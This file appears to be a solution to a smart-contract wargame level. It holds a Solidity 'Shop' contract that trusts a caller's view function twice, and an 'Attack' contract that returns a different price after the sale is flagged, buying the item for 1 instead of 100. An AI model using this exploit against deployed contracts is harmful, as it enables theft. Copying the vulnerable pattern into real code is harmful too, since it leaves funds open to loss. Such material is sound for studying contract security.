// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Attack {
    Shop shop; 
    
    function attack(address _addr) public{
        shop = Shop(_addr);
        shop.buy();
    }

    function price() public view returns (uint){
        if(!shop.isSold()){
            return 101;
        }else{
            return 1;
        }
    }
}